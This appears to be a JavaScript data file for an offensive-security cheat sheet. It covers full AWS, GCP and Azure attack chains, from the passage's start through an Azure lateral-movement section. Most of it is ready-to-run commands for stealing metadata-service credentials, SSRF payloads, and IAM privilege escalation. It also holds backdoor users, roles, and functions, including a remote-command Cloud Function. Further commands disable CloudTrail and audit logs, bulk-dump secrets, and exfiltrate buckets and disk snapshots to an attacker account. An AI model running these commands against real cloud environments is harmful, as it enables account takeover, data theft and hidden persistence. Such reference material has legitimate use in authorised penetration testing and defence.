vault kv list secret/
vault kv get secret/database
vault kv get secret/aws

# Vault AppRole — if you have role_id and secret_id
curl -X POST http://vault.corp.local:8200/v1/auth/approle/login \
  -d '{"role_id":"<ROLE_ID>","secret_id":"<SECRET_ID>"}' | jq '.auth.client_token'

# AWS Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id /prod/database/password
aws secretsmanager get-secret-value --secret-id myapp/api-keys

# AWS SSM Parameter Store
aws ssm get-parameters-by-path --path / --recursive --with-decryption
aws ssm get-parameter --name /prod/db/password --with-decryption

# AWS IMDS — get temporary IAM credentials (from EC2 instance)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token
# Use them:
export AWS_ACCESS_KEY_ID=<KEY>
export AWS_SECRET_ACCESS_KEY=<SECRET>
export AWS_SESSION_TOKEN=<TOKEN>
aws sts get-caller-identity

# IMDSv2 (requires token request first)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/`
      }
    ]
  },
  {
    id: 'aws-cloud',
    title: 'AWS Cloud Attack Surface',
    subtitle: 'Full attack chain: enumeration → exploitation → lateral movement → post-exploitation in AWS environments',
    tags: ['IMDS', 'IAM', 'STS', 'S3', 'EC2', 'Lambda', 'SSM', 'Secrets Manager', 'privilege escalation', 'cross-account'],
    accentColor: 'red',
    overview: 'AWS environments are attacked through a layered approach: initial access via IMDS credential theft from EC2, exposed access keys in code/CI, or overly permissive IAM. From there, enumerate the IAM identity, pivot to higher-privileged roles via sts:AssumeRole, and expand access across services — S3 state files, SSM Parameters, Secrets Manager, Lambda environment variables, and EC2 user-data all leak credentials. Cross-account role chaining and persistent access via rogue IAM users or access keys are the primary post-exploitation goals.',
    steps: [
      'ENUMERATE IDENTITY: aws sts get-caller-identity — confirm current user/role ARN, account ID, and UserID. This always works even with minimal permissions.',
      'ENUMERATE IAM PERMISSIONS: use enumerate-iam.py or aws-consoler to brute-force allowed actions; use iam:SimulatePrincipalPolicy if iam:Get* is allowed',
      'ENUMERATE SERVICES: aws s3 ls, aws ec2 describe-instances, aws lambda list-functions, aws secretsmanager list-secrets — map the attack surface',
      'IMDS CREDENTIAL THEFT: from any EC2 instance — curl 169.254.169.254 for the role credentials, then use them with AWS CLI from attacker host',
      'PRIVESC VIA IAM: check iam:CreateAccessKey on other users, iam:AttachUserPolicy, iam:PassRole to Lambda/EC2 for privilege escalation',
      'LATERAL MOVEMENT: sts:AssumeRole to pivot across accounts and roles; use role chaining to reach admin-equivalent roles in other accounts',
      'POST-EXPLOITATION: create persistent IAM user + access keys, attach AdministratorAccess policy, exfiltrate all S3 data, dump all secrets',
    ],
    commands: [
      {
        title: 'Phase 1 — Enumeration',
        code: `# --- Identity & Account ---
aws sts get-caller-identity                          # Who am I? ARN, AccountID, UserID
aws iam get-user                                     # IAM user details
aws iam list-attached-user-policies --user-name USER # Policies attached to current user
aws iam list-user-policies --user-name USER          # Inline policies
aws iam list-groups-for-user --user-name USER        # Groups (and their policies)
aws iam get-account-authorization-details           # FULL IAM dump (if allowed) — all users, roles, policies

# --- Brute-force permissions (no iam:List required) ---
# enumerate-iam: https://github.com/andresriancho/enumerate-iam
python3 enumerate_iam.py --access-key KEY --secret-key SECRET --session-token TOKEN

# --- Roles & Trust Policies ---
aws iam list-roles | jq '.Roles[] | {RoleName, Arn, AssumeRolePolicyDocument}'
aws iam get-role --role-name ROLE_NAME
# Find roles assumable by current identity:
aws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal | tostring | contains("sts.amazonaws.com"))'

# --- EC2 & Compute ---
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress,PrivateIpAddress,IamInstanceProfile,State.Name]' --output table
aws ec2 describe-instance-attribute --instance-id i-XXXX --attribute userData | base64 -d   # User-data: often contains creds
aws ec2 describe-security-groups                    # Open ports, exposed services
aws ec2 describe-vpcs && aws ec2 describe-subnets   # Network topology

# --- S3 ---
aws s3 ls                                           # List all buckets
aws s3 ls s3://BUCKET --recursive                   # List bucket contents
aws s3 cp s3://BUCKET/terraform.tfstate /tmp/       # Grab Terraform state (goldmine)
aws s3 cp s3://BUCKET/.env /tmp/                    # .env files
# Check for public buckets:
aws s3api get-bucket-acl --bucket BUCKET
aws s3api get-bucket-policy --bucket BUCKET

# --- Secrets & Parameters ---
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME
aws ssm describe-parameters --query 'Parameters[].Name'
aws ssm get-parameters-by-path --path / --recursive --with-decryption

# --- Lambda ---
aws lambda list-functions
aws lambda get-function-configuration --function-name FUNC   # Env vars: DB passwords, API keys
aws lambda get-function --function-name FUNC | jq '.Code.Location'  # Download source code URL

# --- RDS & Databases ---
aws rds describe-db-instances --query 'DBInstances[].[DBInstanceIdentifier,Endpoint.Address,MasterUsername,PubliclyAccessible]'

# --- CloudTrail (attacker tradecraft) ---
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name TRAIL_NAME   # Is logging enabled?`
      },
      {
        title: 'Phase 2 — Exploitation',
        code: `# --- IMDS Credential Theft (from compromised EC2) ---
# IMDSv1 (no auth required):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
# Returns: AccessKeyId, SecretAccessKey, Token — valid for the full role permission set

# IMDSv2 (hop token first):
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# SSRF → IMDS (from web app on EC2):
# Payload: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
# IMDSv2 SSRF bypass (single-hop): include PUT trick or hope IMDSv1 is still active

# --- Use stolen credentials ---
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity    # Confirm identity

# --- IAM Privilege Escalation Paths ---
# 1. CreateAccessKey on another user (instant privilege escalation)
aws iam create-access-key --user-name admin-user
# Returns new AccessKeyId + SecretAccessKey for admin-user

# 2. AttachUserPolicy — give yourself AdministratorAccess
aws iam attach-user-policy --user-name TARGET_USER \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. CreateLoginProfile — create console password for IAM user
aws iam create-login-profile --user-name admin --password 'Pwned123!'

# 4. iam:PassRole + Lambda (create function with privileged role)
aws lambda create-function \
  --function-name backdoor \
  --runtime python3.11 \
  --role arn:aws:iam::ACCOUNT:role/PRIVILEGED_ROLE \
  --handler index.handler \
  --zip-file fileb://payload.zip
aws lambda invoke --function-name backdoor output.json

# 5. iam:PassRole + EC2 (launch instance with privileged instance profile)
aws ec2 run-instances \
  --image-id ami-XXXXXX \
  --iam-instance-profile Arn=arn:aws:iam::ACCOUNT:instance-profile/AdminProfile \
  --user-data file://revshell.sh \
  --instance-type t2.micro

# --- Exposed keys in GitHub/code (automated scanning) ---
trufflehog github --repo https://github.com/ORG/REPO
gitleaks detect --source . --verbose
# Find keys: grep -r "AKIA\|ASIA\|aws_secret" . (AKIA = long-term, ASIA = STS temp)`
      },
      {
        title: 'Phase 3 — Lateral Movement & Pivoting',
        code: `# --- STS AssumeRole — pivot to other roles ---
aws sts assume-role \
  --role-arn arn:aws:iam::TARGET_ACCOUNT:role/ROLE_NAME \
  --role-session-name RedTeam
# Returns new temporary credentials — export and use

# Cross-account role chaining:
# Account A has role that trusts Account B → assume role in A using creds from B
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_A:role/CrossAccountAdmin --role-session-name pivot

# Find all assumable roles (enumerate trust policies):
aws iam list-roles | jq -r '.Roles[] | .RoleName + " | " + (.AssumeRolePolicyDocument | tostring)' | grep -v "service.amazonaws"

# --- EC2 Instance Connect / SSM Session Manager ---
# SSM Session Manager — shell into EC2 without SSH (if SSM agent installed)
aws ssm start-session --target i-INSTANCEID
# Requires: ssm:StartSession permission

# EC2 Instance Connect (push temp SSH key):
aws ec2-instance-connect send-ssh-public-key \
  --instance-id i-XXXX \
  --availability-zone us-east-1a \
  --instance-os-user ec2-user \
  --ssh-public-key file://attacker.pub
ssh -i attacker.pem ec2-user@PUBLIC_IP

# --- Lambda → VPC Internal Access ---
# If Lambda is in a VPC, it can reach internal services:
aws lambda update-function-code --function-name TARGET \
  --zip-file fileb://internal_scanner.zip
aws lambda invoke --function-name TARGET output.json
# Lambda can now reach RDS, ElastiCache, internal ALBs

# --- ECS / Fargate Task Metadata ---
# From inside ECS task — get task role credentials:
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
# Returns role credentials valid for ECS task role

# --- Pivot via EKS ---
aws eks update-kubeconfig --name CLUSTER_NAME --region us-east-1
kubectl get pods --all-namespaces
# Each pod has SA token → assume roles via IRSA (if sts:AssumeRoleWithWebIdentity allowed)

# --- VPC Peering / Transit Gateway enumeration ---
aws ec2 describe-vpc-peering-connections  # Find peered VPCs (other environments, accounts)
aws ec2 describe-transit-gateways
aws ec2 describe-route-tables | jq '.RouteTables[].Routes[]'`
      },
      {
        title: 'Phase 4 — Post-Exploitation & Persistence',
        code: `# --- Create persistent backdoor IAM user ---
aws iam create-user --user-name svc-monitoring
aws iam attach-user-policy --user-name svc-monitoring \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name svc-monitoring
# Save AccessKeyId + SecretAccessKey — these are long-lived (no expiry unless rotated)

# --- Create backdoor role with permissive trust ---
aws iam create-role --role-name BackdoorRole \
  --assume-role-policy-document '{
    "Version":"2012-10-17",
    "Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ATTACKER_ACCOUNT:root"},"Action":"sts:AssumeRole"}]
  }'
aws iam attach-role-policy --role-name BackdoorRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# --- Console access (hijack federation) ---
# Generate console sign-in URL from temporary credentials:
python3 -c "
import json, urllib.parse, urllib.request
creds = {'sessionId':'AKID','sessionKey':'SECRET','sessionToken':'TOKEN'}
params = {'Action':'getSigninToken','Session':json.dumps(creds)}
url = 'https://signin.aws.amazon.com/federation?' + urllib.parse.urlencode(params)
token = json.loads(urllib.request.urlopen(url).read())['SigninToken']
signin = 'https://signin.aws.amazon.com/federation?Action=login&Issuer=&Destination=https://console.aws.amazon.com/&SigninToken=' + token
print(signin)
"

# --- Disable CloudTrail logging (cover tracks) ---
aws cloudtrail stop-logging --name TRAIL_NAME
aws cloudtrail delete-trail --name TRAIL_NAME

# --- Mass S3 exfiltration ---
aws s3 sync s3://BUCKET /tmp/exfil/ --quiet
# All buckets:
aws s3 ls | awk '{print $3}' | xargs -I{} aws s3 sync s3://{} /tmp/exfil/{}/

# --- Secrets bulk dump ---
aws secretsmanager list-secrets | jq -r '.SecretList[].Name' | \
  xargs -I{} aws secretsmanager get-secret-value --secret-id {} | jq '.SecretString'

# --- EC2 snapshot exfiltration (offline disk analysis) ---
aws ec2 create-snapshot --volume-id vol-XXXX --description "backup"
aws ec2 modify-snapshot-attribute --snapshot-id snap-XXXX \
  --attribute createVolumePermission --operation-type add \
  --user-ids ATTACKER_ACCOUNT_ID
# In attacker account: create volume from snapshot, mount it

# --- Lambda backdoor (persistent code execution) ---
aws lambda update-function-code --function-name LEGIT_FUNC \
  --zip-file fileb://backdoored.zip
# Backdoor runs every time the function is invoked`
      }
    ]
  },
  {
    id: 'gcp-cloud',
    title: 'GCP Cloud Attack Surface',
    subtitle: 'Full attack chain: enumeration → exploitation → lateral movement → post-exploitation in Google Cloud',
    tags: ['Metadata API', 'Service Account', 'SA keys', 'GCS', 'Cloud Run', 'IAM', 'Workload Identity', 'GKE', 'Cloud Functions'],
    accentColor: 'red',
    overview: 'GCP attacks begin at the metadata server (metadata.google.internal) on any GCE instance, which returns service account tokens without authentication. Service account key files (.json) leaked to GCS, Cloud Source Repositories, or GitHub are the most common initial access vector. GCP IAM uses a flat model where project-level roles (Owner, Editor) grant sweeping access — a single service account with Editor can read all secrets, enumerate all storage, and escalate to Owner via IAM policy manipulation. Workload Identity Federation (for CI/CD) can be abused if subject constraints are too broad.',
    steps: [
      'ENUMERATE IDENTITY: gcloud auth list, gcloud config list — confirm active account, project, and impersonation chain',
      'METADATA API: curl metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token — get OAuth2 token for the attached SA',
      'ENUMERATE IAM: gcloud projects get-iam-policy PROJECT — map who has what roles; gcloud iam service-accounts list for all SAs',
      'GCS RECON: gsutil ls, gsutil cat gs://BUCKET/file — S3-equivalent; Terraform state, backups, and .env files commonly stored here',
      'PRIVESC VIA IAM: iam.serviceAccounts.actAs (impersonate any SA), iam.roles.update (add permissions to existing role), resourcemanager.projects.setIamPolicy',
      'LATERAL MOVEMENT: impersonate SAs via --impersonate-service-account flag; generate SA keys for offline persistence; pivot to GKE via workload identity',
      'POST-EXPLOITATION: export SA key for persistent access, manipulate org-level IAM policy, dump Secret Manager secrets, exfiltrate Cloud SQL data',
    ],
    commands: [
      {
        title: 'Phase 1 — Enumeration',
        code: `# --- Identity ---
gcloud auth list                           # Active accounts
gcloud config list                         # Current project, account, region
gcloud auth print-access-token            # Print current OAuth2 token
gcloud iam service-accounts list          # All service accounts in project

# --- Metadata API (from any GCE VM — no auth) ---
# Token for attached service account:
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
# Returns: access_token (OAuth2), expires_in, token_type

# Other useful metadata paths:
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/attributes/" -H "Metadata-Flavor: Google" # startup-script, ssh-keys
curl -s "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys" -H "Metadata-Flavor: Google"
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" -H "Metadata-Flavor: Google"

# SSRF → Metadata (web app on GCE):
# Payload URL: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header required: Metadata-Flavor: Google (check if SSRF allows custom headers)
# Bypass: http://metadata.google.internal/ sometimes accessible without header from certain apps

# --- IAM enumeration ---
gcloud projects get-iam-policy PROJECT_ID --format json
gcloud projects list                      # All projects accessible
gcloud organizations list                 # If org-level access
gcloud resource-manager folders list --organization ORG_ID

# --- GCE Instances ---
gcloud compute instances list --format="table(name,zone,status,networkInterfaces[0].accessConfigs[0].natIP,serviceAccounts[0].email)"
gcloud compute instances describe INSTANCE --zone ZONE
gcloud compute instances get-serial-port-output INSTANCE --zone ZONE  # Boot logs — may contain creds

# --- Storage (GCS) ---
gsutil ls                                  # List all accessible buckets
gsutil ls -r gs://BUCKET                  # Recursive list
gsutil cat gs://BUCKET/terraform.tfstate  # Terraform state
gsutil cat gs://BUCKET/.env
# Check for public buckets:
gsutil iam get gs://BUCKET | grep allUsers

# --- Secrets ---
gcloud secrets list
gcloud secrets versions access latest --secret=SECRET_NAME
gcloud secrets versions list SECRET_NAME

# --- Cloud Functions & Cloud Run ---
gcloud functions list
gcloud functions describe FUNCTION_NAME   # Env vars, SA, runtime
gcloud run services list
gcloud run services describe SERVICE_NAME --region REGION

# --- GKE ---
gcloud container clusters list
gcloud container clusters get-credentials CLUSTER --zone ZONE  # Update kubeconfig

# --- Cloud SQL ---
gcloud sql instances list
gcloud sql databases list --instance INSTANCE_NAME`
      },
      {
        title: 'Phase 2 — Exploitation',
        code: `# --- Use stolen OAuth2 token ---
export ACCESS_TOKEN=<TOKEN_FROM_METADATA>
# Test token:
curl -s "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$ACCESS_TOKEN"
# Use with gcloud:
gcloud config set auth/access_token_file /dev/null
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"

# --- Service Account Key Exfiltration ---
# Keys in GCS:
gsutil ls -r gs:// | grep ".json"
gsutil cat gs://BUCKET/sa-key.json > /tmp/sa.json
gcloud auth activate-service-account --key-file=/tmp/sa.json
gcloud config set project PROJECT_ID
gcloud auth print-access-token

# Keys in Cloud Source Repositories:
gcloud source repos list
gcloud source repos clone REPO_NAME
grep -r "private_key\|client_email" .

# --- IAM Privilege Escalation ---
# Check current permissions:
gcloud projects get-iam-policy $(gcloud config get-value project)

# Path 1: iam.serviceAccounts.actAs → impersonate higher-priv SA
gcloud --impersonate-service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \
  iam service-accounts list

# Path 2: iam.serviceAccountKeys.create → generate persistent key for any SA
gcloud iam service-accounts keys create /tmp/pwned.json \
  --iam-account=TARGET_SA@PROJECT.iam.gserviceaccount.com

# Path 3: resourcemanager.projects.setIamPolicy → add owner binding
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="user:attacker@gmail.com" \
  --role="roles/owner"

# Path 4: iam.roles.update → add permissions to existing role you hold
gcloud iam roles update ROLE_NAME --project PROJECT_ID \
  --add-permissions=iam.serviceAccountKeys.create

# Path 5: Cloud Functions with higher-priv SA
gcloud functions deploy backdoor \
  --runtime python39 \
  --trigger-http \
  --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \
  --entry-point=handler \
  --source ./payload
gcloud functions call backdoor --data '{"cmd":"env"}'

# --- Workload Identity Federation Abuse ---
# If external identity (GitHub Actions, AWS role) is trusted with no subject constraint:
curl "https://sts.googleapis.com/v1/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=GITHUB_OIDC_TOKEN&subject_token_type=urn:ietf:params:oauth:token-type:jwt&requested_token_type=urn:ietf:params:oauth:token-type:access_token&scope=https://www.googleapis.com/auth/cloud-platform&audience=POOL_PROVIDER"`
      },
      {
        title: 'Phase 3 — Lateral Movement & Pivoting',
        code: `# --- Impersonate Service Accounts ---
# If you have iam.serviceAccounts.actAs or roles/iam.serviceAccountTokenCreator:
gcloud --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com \
  projects get-iam-policy PROJECT_ID

# Generate token for impersonated SA:
gcloud auth print-access-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com

# --- Cross-Project Lateral Movement ---
# If SA has bindings in multiple projects:
gcloud projects list --filter="lifecycleState=ACTIVE"
for proj in $(gcloud projects list --format="value(projectId)"); do
  echo "=== $proj ===";
  gcloud compute instances list --project=$proj 2>/dev/null;
done

# --- GKE → Cloud Escalation (Workload Identity) ---
# If GKE pod has Workload Identity annotation → get GCP token from inside pod:
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
# Pod SA mapped to GCP SA — use token for full GCP access

# --- Cloud SQL Auth Proxy pivot ---
# If you can run Cloud SQL Auth Proxy with impersonated SA:
./cloud_sql_proxy -instances=PROJECT:REGION:INSTANCE=tcp:5432 \
  -impersonate-service-account=dba-sa@PROJECT.iam.gserviceaccount.com &
psql -h 127.0.0.1 -U postgres

# --- SSH via GCE metadata (OS Login / metadata SSH keys) ---
# Add your SSH key via metadata if compute.instances.setMetadata allowed:
gcloud compute instances add-metadata INSTANCE \
  --metadata "ssh-keys=attacker:$(cat ~/.ssh/id_rsa.pub)" \
  --zone ZONE
ssh attacker@INSTANCE_EXTERNAL_IP

# Alternatively via gcloud (uses OS Login):
gcloud compute ssh INSTANCE --zone ZONE --project PROJECT

# --- Cloud Run → internal VPC ---
# Cloud Run with VPC connector can reach internal resources
# Deploy a Cloud Run service with VPC access to scan internal subnets:
gcloud run deploy scanner \
  --image gcr.io/PROJECT/scanner \
  --vpc-connector CONNECTOR_NAME \
  --region REGION

# --- Organization-level pivot ---
gcloud organizations list
gcloud resource-manager org-policies list --organization ORG_ID
# If org-level IAM binding exists → access ALL projects under org`
      },
      {
        title: 'Phase 4 — Post-Exploitation & Persistence',
        code: `# --- Persistent SA key (long-lived credentials) ---
gcloud iam service-accounts keys create /tmp/backdoor.json \
  --iam-account=editor-sa@PROJECT.iam.gserviceaccount.com
# .json key = permanent access until manually revoked
# Exfiltrate and use:
gcloud auth activate-service-account --key-file=/tmp/backdoor.json
gcloud auth print-access-token

# --- Add external identity as Owner ---
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="user:attacker@gmail.com" \
  --role="roles/owner"
gcloud organizations add-iam-policy-binding ORG_ID \
  --member="serviceAccount:backdoor@PROJECT.iam.gserviceaccount.com" \
  --role="roles/resourcemanager.organizationAdmin"

# --- Mass Secret Dump ---
gcloud secrets list --format="value(name)" | \
  xargs -I{} gcloud secrets versions access latest --secret={}

# --- GCS Exfiltration ---
gsutil -m cp -r gs://BUCKET /tmp/exfil/
# All buckets:
gsutil ls | xargs -I{} gsutil -m cp -r {} /tmp/exfil/

# --- Cloud SQL dump via IAM auth ---
gcloud sql export sql INSTANCE gs://BUCKET/dump.sql --database=DB_NAME
gsutil cp gs://BUCKET/dump.sql /tmp/

# --- Disable audit logging (cover tracks) ---
gcloud projects get-iam-policy PROJECT_ID --format json > policy.json
# Edit: add "allServices" with "ADMIN_READ","DATA_READ","DATA_WRITE" to exemptedMembers
gcloud projects set-iam-policy PROJECT_ID modified_policy.json

# --- Cloud Function backdoor (persistence) ---
cat > main.py << 'EOF'
import subprocess, os
def handler(request):
    cmd = request.args.get('cmd', 'id')
    return subprocess.check_output(cmd, shell=True).decode()
EOF
gcloud functions deploy backdoor-fn \
  --runtime python39 \
  --trigger-http \
  --allow-unauthenticated \
  --entry-point handler

# --- Snapshot exfiltration ---
gcloud compute disks snapshot DISK_NAME --zone ZONE --snapshot-names exfil-snap
gcloud compute snapshots create exfil-snap --source-disk=DISK --source-disk-zone=ZONE
# Share snapshot with attacker project:
gcloud compute images create exfil-image --source-snapshot=exfil-snap
gcloud compute images add-iam-policy-binding exfil-image \
  --member='allAuthenticatedUsers' --role='roles/compute.imageUser'`
      }
    ]
  },
  {
    id: 'azure-cloud',
    title: 'Azure Cloud Attack Surface',
    subtitle: 'Full attack chain: enumeration → exploitation → lateral movement → post-exploitation in Microsoft Azure',
    tags: ['IMDS', 'Managed Identity', 'MSI', 'Key Vault', 'Storage', 'Azure AD', 'RBAC', 'Service Principal', 'ARM', 'PIM'],
    accentColor: 'red',
    overview: 'Azure attacks leverage the Instance Metadata Service (169.254.169.254) for Managed Identity token theft, exposed Service Principal credentials in code and CI pipelines, and misconfigured Azure AD roles. Azure RBAC and Azure AD roles are separate — a subscription Owner is not automatically a Global Administrator. Key Vault access policies, Storage Account SAS tokens, and app registrations (client secrets/certificates) are the primary credential targets. Persistent access is achieved via rouge Service Principals, federated credentials, or Privileged Identity Management (PIM) role activations.',
    steps: [
      'ENUMERATE IDENTITY: az account show, az ad signed-in-user show — confirm subscription, tenant, and principal identity',
      'IMDS TOKEN THEFT: curl IMDS endpoint for Managed Identity token — covers any resource (ARM, Key Vault, Storage, Graph)',
      'ENUMERATE AZURE AD: az ad user list, az ad sp list, az ad app list — map users, service principals, and app registrations with their permissions',
      'ENUMERATE RBAC: az role assignment list --all — find all role assignments across subscription; look for Owner, Contributor, User Access Administrator',
      'EXPLOIT SERVICE PRINCIPALS: steal client secrets from app registrations, enumerate SP permissions, check for certificate credentials',
      'LATERAL MOVEMENT: az account list for multiple subscriptions, management group traversal, impersonate via az login --service-principal',
      'POST-EXPLOITATION: create backdoor SP with client secret, assign Owner role, dump Key Vault secrets, exfiltrate storage accounts',
    ],
    commands: [
      {
        title: 'Phase 1 — Enumeration',
        code: `# --- Identity & Subscription ---
az account show                               # Current subscription, tenant ID, user
az account list                               # All accessible subscriptions
az account list --all --output table
az ad signed-in-user show                     # Current AAD user details
az ad signed-in-user list-owned-objects       # Objects owned by current user

# --- Azure AD: Users, Groups, SPs ---
az ad user list --output table                # All AAD users
az ad user show --id USER_UPN_OR_ID
az ad group list --output table               # All AAD groups
az ad group member list --group "Global Administrators"
az ad sp list --all --output table            # All service principals
az ad app list --all --output table           # All app registrations
az ad app credential list --id APP_ID         # Certificates and secrets for app

# --- Role Assignments (RBAC) ---
az role assignment list --all --output table  # All role assignments in subscription
az role assignment list --assignee USER_OR_SP # Roles for specific identity
# Find Owner/Contributor/UserAccessAdmin:
az role assignment list --all | jq '.[] | select(.roleDefinitionName | test("Owner|Contributor|User Access"))'

# --- Azure AD Roles ---
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles" | jq '.value[] | {displayName, id}'
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/ROLE_ID/members"
# Check if current user has Global Admin:
az rest --method GET --url "https://graph.microsoft.com/v1.0/me/memberOf" | jq '.value[].displayName'

# --- Resource Enumeration ---
az resource list --output table               # All resources in subscription
az vm list --output table                     # Virtual machines
az vm list -d --output table                  # Include power state, public IPs
az storage account list --output table        # Storage accounts
az keyvault list --output table               # Key Vaults
az functionapp list --output table            # Function Apps (check app settings for creds)
az webapp list --output table                 # Web Apps
az sql server list --output table             # SQL Servers
az aks list --output table                    # AKS clusters

# --- Key Vault ---
az keyvault secret list --vault-name VAULT    # List secrets
az keyvault secret show --vault-name VAULT --name SECRET_NAME  # Read secret
az keyvault key list --vault-name VAULT       # Encryption keys
az keyvault certificate list --vault-name VAULT
az keyvault show --name VAULT | jq '.properties.accessPolicies'  # Access policies

# --- Storage ---
az storage account list --query '[].{Name:name,Blob:primaryEndpoints.blob}'
az storage container list --account-name ACCOUNT --auth-mode login
az storage blob list --container-name CONTAINER --account-name ACCOUNT --auth-mode login
# List SAS tokens (in connection strings):
az storage account show-connection-string --name ACCOUNT --resource-group RG`
      },
      {
        title: 'Phase 2 — Exploitation',
        code: `# --- IMDS Managed Identity Token (from Azure VM) ---
# Get access token for ARM (management):
curl -s "http://169.254.169.254/metadata/identity/oauth2/token" \
  --header "Metadata: true" \
  --data "api-version=2019-08-01&resource=https://management.azure.com/"
# Returns: access_token, expires_in, token_type

# For Key Vault:
curl -s "http://169.254.169.254/metadata/identity/oauth2/token" \
  --header "Metadata: true" \
  --data "api-version=2019-08-01&resource=https://vault.azure.net"

# For Storage:
curl -s "http://169.254.169.254/metadata/identity/oauth2/token" \
  --header "Metadata: true" \
  --data "api-version=2019-08-01&resource=https://storage.azure.com/"

# For Microsoft Graph (AAD):
curl -s "http://169.254.169.254/metadata/identity/oauth2/token" \
  --header "Metadata: true" \
  --data "api-version=2019-08-01&resource=https://graph.microsoft.com/"

# SSRF → IMDS: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/
# Must include Metadata: true header — many SSRF vulnerabilities allow this

# --- Use stolen ARM token ---
export TOKEN=<ACCESS_TOKEN>
# List subscriptions:
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq '.value[].subscriptionId'
# Set with az CLI:
az account get-access-token  # Compare
az login --use-device-code   # Alternative

# --- Service Principal Credential Abuse ---
# Login with stolen SP credentials:
az login --service-principal \
  --username APP_ID \
  --password CLIENT_SECRET_OR_CERT \
  --tenant TENANT_ID

# Extract SP credentials from:
# 1. Environment variables (common in Azure App Service):
az webapp config appsettings list --name APP --resource-group RG | \
  jq '.[] | select(.name | test("CLIENT|SECRET|KEY|PASS|AZURE"))'

# 2. App Service managed identity + Key Vault reference (auto-resolved):
# App settings like: @Microsoft.KeyVault(SecretUri=https://VAULT.vault.azure.net/secrets/SP-SECRET)
# Read Key Vault directly if you have access

# 3. Azure DevOps service connections (use az devops CLI):
az devops service-endpoint list --org https://dev.azure.com/ORG --project PROJECT

# --- RBAC Privilege Escalation ---
# If you have Microsoft.Authorization/roleAssignments/write:
az role assignment create \
  --assignee ATTACKER_UPN_OR_SP \
  --role "Owner" \
  --scope /subscriptions/SUB_ID

# If you have Microsoft.Authorization/roleDefinitions/write:
# Create custom role with all permissions
az role definition create --role-definition '{
  "Name": "BackdoorRole",
  "Actions": ["*"],
  "AssignableScopes": ["/subscriptions/SUB_ID"]
}'

# --- Azure AD Privilege Escalation ---
# If Global Admin or Privileged Role Admin — add role to own account:
az rest --method POST \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  --body '{"principalId":"ATTACKER_OBJECT_ID","roleDefinitionId":"GLOBAL_ADMIN_ROLE_ID","directoryScopeId":"/"}'`
      },
      {
        title: 'Phase 3 — Lateral Movement & Pivoting',
        code: `# --- Cross-Subscription Lateral Movement ---
az account list --all                        # List all accessible subscriptions
az account set --subscription SUBSCRIPTION_ID
# Re-enumerate resources in each subscription

# --- Management Group traversal ---
az account management-group list
az account management-group show --name MG_NAME
az role assignment list --scope /providers/Microsoft.Management/managementGroups/MG_NAME

# --- Azure AD: Pivot via App Roles and Service Principals ---
# Find SPs with high-privilege Graph API permissions:
az ad sp list --all | jq '.[] | {displayName, appId, appRoles}'
az rest --method GET \
  --url "https://graph.microsoft.com/v1.0/servicePrincipals/SP_ID/appRoleAssignments"
# Look for: RoleManagement.ReadWrite.Directory, Directory.ReadWrite.All

# --- AKS → Azure ---
az aks get-credentials --resource-group RG --name CLUSTER_NAME
kubectl get pods --all-namespaces
# IRSA equivalent: pod SA → Azure Workload Identity → Azure AD token
# Check pod annotations for azure.workload.identity/client-id
